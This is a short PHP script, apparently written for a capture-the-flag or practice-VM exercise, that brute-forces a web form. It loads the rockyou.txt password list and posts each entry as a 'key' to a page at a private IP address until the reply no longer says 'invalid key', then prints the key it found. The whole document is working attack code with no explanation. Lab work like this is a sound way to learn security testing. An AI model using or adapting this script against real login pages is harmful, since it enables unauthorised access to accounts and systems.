<?php

$handle = fopen('rockyou.txt', 'r');
$contents = fread($handle, filesize('rockyou.txt'));
$list = explode("\n", $contents);
$ch = curl_init('http://192.168.56.5/kzMb5nVYJw/index.php');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
for($i = 0; $i < count($list); $i++) {
	curl_setopt($ch, CURLOPT_POSTFIELDS, ['key' => $list[$i]]);
	$response = curl_exec($ch);
	if(!preg_match("/invalid key/i", $response)) {
		echo "Key is ~ \e[32m" . $list[$i], "\n";
		break;
	} else {
		echo 'Wrong - ', $list[$i], "\n";
	}
}

?>
